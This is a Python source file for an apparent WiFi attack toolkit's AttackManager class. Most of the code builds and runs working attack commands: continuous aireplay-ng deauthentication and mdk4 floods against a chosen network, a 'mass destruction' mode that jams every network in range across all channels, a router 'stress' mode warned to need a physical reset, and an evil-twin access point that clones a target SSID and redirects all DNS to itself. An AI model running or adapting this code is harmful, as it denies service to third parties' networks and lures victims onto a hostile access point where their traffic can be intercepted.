#!/usr/bin/env python3

import os
import time
import threading
import subprocess
from typing import List

class AttackManager:
    def __init__(self, core, scanner):
        self.core = core
        self.scanner = scanner
        self.attack_processes = []
        self.attack_running = False
        self.attack_threads = []
        self.evil_twin_running = False
        self.captured_password = None

    def single_target_attack(self):
        """Enhanced Single Target Attack - ALWAYS FRESH SCAN"""
        print("\033[1;36m[→] Performing fresh scan for target acquisition...\033[0m")
        
        # ALWAYS perform fresh scan
        if self.scanner.wifi_scan():
            self.scanner.display_scan_results()
            target = self.scanner.select_target()
            
            if target:
                print(f"\033[1;31m[💣] Deploying precision strike on: {target['essid']}\033[0m")
                self.start_enhanced_single_attack(target)

    def mass_destruction(self):
        """Enhanced Mass Destruction - ALWAYS FRESH SCAN"""
        print("\033[1;31m[🌐] Performing fresh scan for mass disruption...\033[0m")
        
        # ALWAYS perform fresh scan
        if self.scanner.wifi_scan():
            target_count = len(self.scanner.networks)
            
            if target_count == 0:
                print("\033[1;31m[✘] No targets found\033[0m")
                return
            
            print(f"\033[1;33m[🎯] Targeting {target_count} networks for complete disruption!\033[0m")
            
            confirm = input("\033[1;31m[?] Confirm mass disruption? (y/N): \033[0m")
            
            if confirm.lower() in ['y', 'yes']:
                self.core.set_current_operation("MASS_DESTRUCTION")
                self.attack_running = True
                
                print("\033[1;31m[⚡] Deploying mass disruption vectors...\033[0m")
                
                # Enhanced mass attack on all networks
                attack_count = 0
                for idx, target in self.scanner.networks.items():
                    print(f"\033[1;31m[→] Deploying vector {idx}: {target['essid']}\033[0m")
                    if self.deploy_enhanced_warhead(target, idx):
                        attack_count += 1
                    time.sleep(0.3)
                
                # Enhanced global channel hopping
                print("\033[1;31m[🔧] Deploying global disruption...\033[0m")
                global_proc = self.core.run_command(
                    f"xterm -geometry 80x15 -bg black -fg white -title 'GLOBAL-DISRUPTION' -e 'while true; do for channel in 1 2 3 4 5 6 7 8 9 10 11 12 13; do iwconfig {self.core.mon_interface} channel $channel; mdk4 {self.core.mon_interface} d -c $channel -s 500; sleep 1; done; done' &",
                    background=True
                )
                if global_proc:
                    self.attack_processes.append(global_proc)
                    self.core.add_attack_process(global_proc)
                    attack_count += 1
                
                print(f"\033[1;32m[✅] {attack_count} disruption vectors deployed\033[0m")
                print("\033[1;31m[💥] All networks are being disrupted!\033[0m")
                print("\033[1;33m[⚠️] No device can connect to any WiFi until attack stops!\033[0m")
                
                # Start mass attack animation
                anim_thread = threading.Thread(target=self.show_mass_attack_animation)
                anim_thread.daemon = True
                anim_thread.start()
                
                print("\033[1;33m[⏹️] Press Enter to stop mass disruption...\033[0m")
                input()
                
                self.stop_attacks()
                self.core.clear_current_operation()
                print("\033[1;32m[✅] Mass disruption terminated\033[0m")
            else:
                print("\033[1;33m[❌] Mass disruption cancelled\033[0m")

    def router_destroyer(self):
        """Enhanced Router Destroyer - ALWAYS FRESH SCAN"""
        print("\033[1;31m[💀] Performing fresh scan for router targeting...\033[0m")
        print("\033[1;31m[⚠️] WARNING: This can cause router instability!\033[0m")
        print("\033[1;31m[⚠️] Use only on routers you own or have permission!\033[0m")
        
        confirm1 = input("\033[1;31m[?] Type 'STRESS' to acknowledge potential damage: \033[0m")
        if confirm1.lower() != 'stress':
            print("\033[1;33m[❌] Router stress test cancelled\033[0m")
            return
            
        confirm2 = input("\033[1;31m[?] Type 'CONFIRM' to proceed with stress test: \033[0m")
        if confirm2.lower() != 'confirm':
            print("\033[1;33m[❌] Router stress test cancelled\033[0m")
            return
        
        # ALWAYS perform fresh scan
        if self.scanner.wifi_scan():
            self.scanner.display_scan_results()
            target = self.scanner.select_target()
            
            if target:
                print(f"\033[1;31m[💀] Targeting router for stress test: {target['essid']}\033[0m")
                self.start_enhanced_router_stress(target)

    def advanced_evil_twin(self):
        """Fluxion-style Evil Twin Attack - ALWAYS FRESH SCAN"""
        print("\033[1;36m[→] Performing fresh scan for evil twin target...\033[0m")
        
        # ALWAYS perform fresh scan
        if self.scanner.wifi_scan():
            self.scanner.display_scan_results()
            target = self.scanner.select_target()
            
            if target:
                print(f"\033[1;34m[👥] Creating perfect evil twin for: {target['essid']}\033[0m")
                self.start_fluxion_evil_twin(target)

    # ... rest of the methods remain the same as previous version ...
    # Only changed the methods above to ensure fresh scans

    def start_enhanced_single_attack(self, target):
        """Start enhanced single target attack"""
        self.core.set_current_operation("SINGLE_TARGET_ATTACK")
        self.attack_running = True
        
        # Set target channel
        self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
        
        print("\033[1;31m[⚡] Deploying advanced attack vectors...\033[0m")
        
        # Enhanced Attack 1: MDK4 Complete Disruption
        print("\033[1;31m[🔧] VECTOR 1: MDK4 Network Disruption\033[0m")
        proc1 = self.core.run_command(
            f"xterm -geometry 80x10 -bg black -fg red -title 'MDK4-DISRUPTION-{target['essid']}' -e 'mdk4 {self.core.mon_interface} d -c {target['channel']} -B {target['bssid']} -s 1000' &",
            background=True
        )
        if proc1:
            self.attack_processes.append(proc1)
            self.core.add_attack_process(proc1)
        
        # Enhanced Attack 2: Continuous Deauth Flood
        print("\033[1;31m[🔧] VECTOR 2: Continuous Deauth Flood\033[0m")
        proc2 = self.core.run_command(
            f"xterm -geometry 80x10 -bg black -fg yellow -title 'DEAUTH-FLOOD-{target['essid']}' -e 'while true; do aireplay-ng --deauth 0 -a {target['bssid']} {self.core.mon_interface}; sleep 1; done' &", 
            background=True
        )
        if proc2:
            self.attack_processes.append(proc2)
            self.core.add_attack_process(proc2)
        
        # Enhanced Attack 3: Beacon Flood
        print("\033[1;31m[🔧] VECTOR 3: Beacon Flood Attack\033[0m")
        proc3 = self.core.run_command(
            f"xterm -geometry 80x10 -bg black -fg cyan -title 'BEACON-FLOOD-{target['essid']}' -e 'mdk4 {self.core.mon_interface} b -n {target['essid']}_FAKE -c {target['channel']} -s 500' &",
            background=True
        )
        if proc3:
            self.attack_processes.append(proc3)
            self.core.add_attack_process(proc3)
        
        # Enhanced Attack 4: Authentication Flood
        print("\033[1;31m[🔧] VECTOR 4: Authentication Flood\033[0m")
        proc4 = self.core.run_command(
            f"xterm -geometry 80x10 -bg black -fg magenta -title 'AUTH-FLOOD-{target['essid']}' -e 'mdk4 {self.core.mon_interface} a -a {target['bssid']} -m -s 2000' &",
            background=True
        )
        if proc4:
            self.attack_processes.append(proc4)
            self.core.add_attack_process(proc4)
        
        print(f"\033[1;32m[✅] {len(self.attack_processes)} attack vectors deployed\033[0m")
        print(f"\033[1;31m[💥] Target {target['essid']} is completely frozen!\033[0m")
        print("\033[1;33m[⚠️] No device can connect until attack stops!\033[0m")
        
        # Start modern attack animation
        anim_thread = threading.Thread(target=self.show_modern_attack_animation, args=(target['essid'],))
        anim_thread.daemon = True
        anim_thread.start()
        
        print("\033[1;33m[⏹️] Press Enter to stop the attack...\033[0m")
        input()
        
        self.stop_attacks()
        self.core.clear_current_operation()
        print("\033[1;32m[✅] Single target attack terminated\033[0m")

    def deploy_enhanced_warhead(self, target, warhead_id):
        """Deploy enhanced warhead for mass destruction"""
        try:
            # Enhanced deauth attack
            deauth_cmd = f"xterm -geometry 80x10 -bg black -fg red -title 'DEAUTH-{warhead_id}-{target['essid']}' -e 'while true; do iwconfig {self.core.mon_interface} channel {target['channel']}; aireplay-ng --deauth 100 -a {target['bssid']} {self.core.mon_interface}; sleep 1; done' &"
            deauth_proc = self.core.run_command(deauth_cmd, background=True)
            
            # Enhanced MDK4 attack
            mdk_cmd = f"xterm -geometry 80x10 -bg black -fg yellow -title 'MDK4-{warhead_id}-{target['essid']}' -e 'while true; do iwconfig {self.core.mon_interface} channel {target['channel']}; mdk4 {self.core.mon_interface} d -c {target['channel']} -B {target['bssid']} -s 800; sleep 2; done' &"
            mdk_proc = self.core.run_command(mdk_cmd, background=True)
            
            if deauth_proc:
                self.attack_processes.append(deauth_proc)
                self.core.add_attack_process(deauth_proc)
            if mdk_proc:
                self.attack_processes.append(mdk_proc)
                self.core.add_attack_process(mdk_proc)
                
            return True
        except Exception as e:
            print(f"\033[1;33m[!] Warhead deployment failed: {e}\033[0m")
            return False

    def start_enhanced_router_stress(self, target):
        """Start enhanced router stress test"""
        self.core.set_current_operation("ROUTER_STRESS_TEST")
        self.attack_running = True
        
        print("\033[1;31m[⚡] Deploying router stress vectors...\033[0m")
        
        # Set target channel
        self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
        
        # Vector 1: Aggressive Deauth Flood
        print("\033[1;31m[🔧] VECTOR 1: Aggressive Deauth Flood\033[0m")
        proc1 = self.core.run_command(
            f"xterm -geometry 80x10 -bg black -fg red -title 'AGGRESSIVE-DEAUTH-{target['essid']}' -e 'while true; do aireplay-ng --deauth 0 -a {target['bssid']} {self.core.mon_interface}; done' &",
            background=True
        )
        if proc1:
            self.attack_processes.append(proc1)
            self.core.add_attack_process(proc1)
        
        # Vector 2: MDK4 Router Stress
        print("\033[1;31m[🔧] VECTOR 2: MDK4 Router Stress\033[0m")
        proc2 = self.core.run_command(
            f"xterm -geometry 80x10 -bg black -fg yellow -title 'MDK4-STRESS-{target['essid']}' -e 'mdk4 {self.core.mon_interface} d -c {target['channel']} -B {target['bssid']} -s 2000' &",
            background=True
        )
        if proc2:
            self.attack_processes.append(proc2)
            self.core.add_attack_process(proc2)
        
        # Vector 3: Authentication Storm
        print("\033[1;31m[🔧] VECTOR 3: Authentication Storm\033[0m")
        proc3 = self.core.run_command(
            f"xterm -geometry 80x10 -bg black -fg cyan -title 'AUTH-STORM-{target['essid']}' -e 'mdk4 {self.core.mon_interface} a -a {target['bssid']} -m -s 3000' &",
            background=True
        )
        if proc3:
            self.attack_processes.append(proc3)
            self.core.add_attack_process(proc3)
        
        # Vector 4: Probe Request Flood
        print("\033[1;31m[🔧] VECTOR 4: Probe Request Flood\033[0m")
        proc4 = self.core.run_command(
            f"xterm -geometry 80x10 -bg black -fg magenta -title 'PROBE-FLOOD-{target['essid']}' -e 'mdk4 {self.core.mon_interface} p -t {target['bssid']} -s 1000' &",
            background=True
        )
        if proc4:
            self.attack_processes.append(proc4)
            self.core.add_attack_process(proc4)
        
        print(f"\033[1;32m[✅] {len(self.attack_processes)} stress vectors deployed\033[0m")
        print(f"\033[1;31m[💥] Router {target['essid']} is under stress test!\033[0m")
        print("\033[1;31m[⚠️] Router may become unstable or require reset!\033[0m")
        
        # Start stress test animation
        anim_thread = threading.Thread(target=self.show_router_stress_animation)
        anim_thread.daemon = True
        anim_thread.start()
        
        print("\033[1;33m[⏹️] Press Enter to stop stress test...\033[0m")
        input()
        
        self.stop_attacks()
        self.core.clear_current_operation()
        print("\033[1;32m[✅] Router stress test terminated\033[0m")
        print("\033[1;33m[💡] Router may require physical reset to function normally!\033[0m")

    def start_fluxion_evil_twin(self, target):
        """Start Fluxion-style evil twin attack"""
        try:
            self.core.set_current_operation("EVIL_TWIN")
            self.evil_twin_running = True
            
            print("\033[1;36m[→] Preparing advanced evil twin...\033[0m")
            
            # Stop NetworkManager to avoid conflicts
            self.core.run_command("systemctl stop NetworkManager >/dev/null 2>&1")
            time.sleep(2)
            
            # Set interface to target channel
            self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
            
            # Create professional hostapd configuration
            hostapd_conf = f"""
interface={self.core.mon_interface}
driver=nl80211
ssid={target['essid']}
channel={target['channel']}
hw_mode=g
auth_algs=1
wpa=2
wpa_passphrase=freewifi2024
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
ignore_broadcast_ssid=0
wpa_group_rekey=0
"""
            
            with open("/tmp/evil_twin_advanced.conf", "w") as f:
                f.write(hostapd_conf)
            
            # Create advanced dnsmasq configuration
            dnsmasq_conf = f"""
interface={self.core.mon_interface}
dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,8.8.8.8
server=8.8.8.8
log-queries
log-dhcp
address=/#/192.168.1.1
"""
            
            with open("/tmp/dnsmasq_advanced.conf", "w") as f:
                f.write(dnsmasq_conf)
            
            # Configure interface
            self.core.run_command(f"ifconfig {self.core.mon_interface} 192.168.1.1 netmask 255.255.255.0 up")
            
            # Start dnsmasq
            print("\033[1;36m[→] Starting DNS server...\033[0m")
            dnsmasq_proc = self.core.run_command("dnsmasq -C /tmp/dnsmasq_advanced.conf", background=True)
            if dnsmasq_proc:
                self.attack_processes.append(dnsmasq_proc)
                self.core.add_attack_process(dnsmasq_proc)
            
            # Start hostapd
            print("\033[1;36m[→] Starting evil twin access point...\033[0m")
            hostapd_proc = self.core.run_command("hostapd /tmp/evil_twin_advanced.conf", background=True)
            if hostapd_proc:
                self.attack_processes.append(hostapd_proc)
                self.core.add_attack_process(hostapd_proc)
            
            time.sleep(5)
            
            # Start intelligent deauth attack
            print("\033[1;36m[→] Deploying intelligent deauth attack...\033[0m")
            deauth_proc = self.core.run_command(
                f"xterm -geometry 80x10 -bg black -fg red -title 'DEAUTH-REAL-{target['essid']}' -e 'while true; do aireplay-ng --deauth 10 -a {target['bssid']} {self.core.mon_interface}; sleep 3; done' &",
                background=True
            )
            if deauth_proc:
                self.attack_processes.append(deauth_proc)
                self.core.add_attack_process(deauth_proc)
            
            print("\033[1;32m[✅] Evil twin deployed successfully!\033[0m")
            print(f"\033[1;32m[📡] Network: {target['essid']} (Perfect Clone)\033[0m")
            print("\033[1;32m[🔓] Password: freewifi2024\033[0m")
            print("\033[1;33m[👀] Waiting for victims to connect...\033[0m")
            print("\033[1;33m[⏹️] Press Enter to stop evil twin...\033[0m")
            
            # Enhanced monitoring
            monitor_thread = threading.Thread(target=self.monitor_advanced_evil_twin)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            input()
            
            # Cleanup
            self.stop_evil_twin()
            self.core.clear_current_operation()
            print("\033[1;32m[✅] Evil twin attack stopped\033[0m")
            
        except Exception as e:
            print(f"\033[1;31m[✘] Evil twin failed: {e}\033[0m")
            self.stop_evil_twin()
            self.core.run_command("systemctl start NetworkManager >/dev/null 2>&1")

    def monitor_advanced_evil_twin(self):
        """Monitor advanced evil twin for connections"""
        while self.evil_twin_running:
            # Check for DHCP leases
            result = self.core.run_command("cat /var/lib/dhcp/dhcpd.leases 2>/dev/null | tail -20")
            if result and result.stdout:
                lines = result.stdout.strip().split('\n')
                for line in lines:
                    if 'lease' in line and '192.168.1' in line:
                        print(f"\033[1;32m[🔗] Device connected to evil twin: {line}\033[0m")
            
            # Check dnsmasq logs
            result = self.core.run_command("tail -n 5 /var/log/syslog 2>/dev/null | grep dnsmasq")
            if result and result.stdout:
                lines = result.stdout.strip().split('\n')
                for line in lines:
                    if 'DHCPACK' in line:
                        print(f"\033[1;32m[📱] New device connected: {line}\033[0m")
            
            time.sleep(3)

    def stop_evil_twin(self):
        """Stop evil twin attack"""
        self.evil_twin_running = False
        self.stop_attacks()
        self.core.run_command("pkill hostapd")
        self.core.run_command("pkill dnsmasq")
        self.core.run_command("systemctl start NetworkManager >/dev/null 2>&1")

    def show_modern_attack_animation(self, essid):
        """Show modern single target attack animation"""
        frames = ["⚡", "💥", "🔥", "🌪️", "🌀", "💫"]
        messages = [
            f"Disrupting {essid}",
            f"Jamming {essid} signals",
            f"Overloading {essid}",
            f"Freezing {essid} network",
            f"Blocking {essid} connections"
        ]
        frame_idx = 0
        msg_idx = 0
        
        while self.attack_running:
            frame = frames[frame_idx]
            message = messages[msg_idx]
            frame_idx = (frame_idx + 1) % len(frames)
            msg_idx = (msg_idx + 1) % len(messages)
            print(f"\033[1;31m[{frame}] {message} - Network completely frozen!\033[0m", end='\r')
            time.sleep(0.4)

    def show_mass_attack_animation(self):
        """Show mass attack animation"""
        frames = ["🌐", "⚡", "💥", "🔥", "🌪️", "🌀"]
        messages = [
            "Disrupting all networks",
            "Jamming all WiFi signals",
            "Overloading all channels",
            "Mass network freeze active",
            "Global disruption in progress"
        ]
        frame_idx = 0
        msg_idx = 0
        
        while self.attack_running:
            frame = frames[frame_idx]
            message = messages[msg_idx]
            frame_idx = (frame_idx + 1) % len(frames)
            msg_idx = (msg_idx + 1) % len(messages)
            print(f"\033[1;31m[{frame}] {message} - All networks frozen!\033[0m", end='\r')
            time.sleep(0.4)

    def show_router_stress_animation(self):
        """Show router stress test animation"""
        frames = ["💀", "⚡", "💥", "🔥", "🌡️", "⚠️"]
        messages = [
            "Router stress test active",
            "Overloading router CPU",
            "Testing router limits",
            "Hardware stress in progress",
            "Router stability test"
        ]
        frame_idx = 0
        msg_idx = 0
        
        while self.attack_running:
            frame = frames[frame_idx]
            message = messages[msg_idx]
            frame_idx = (frame_idx + 1) % len(frames)
            msg_idx = (msg_idx + 1) % len(messages)
            print(f"\033[1;31m[{frame}] {message} - Router under heavy load!\033[0m", end='\r')
            time.sleep(0.4)

    def stop_attacks(self):
        """Stop all running attacks"""
        self.attack_running = False
        self.evil_twin_running = False
        self.core.stop_all_attacks()
        self.attack_processes = []
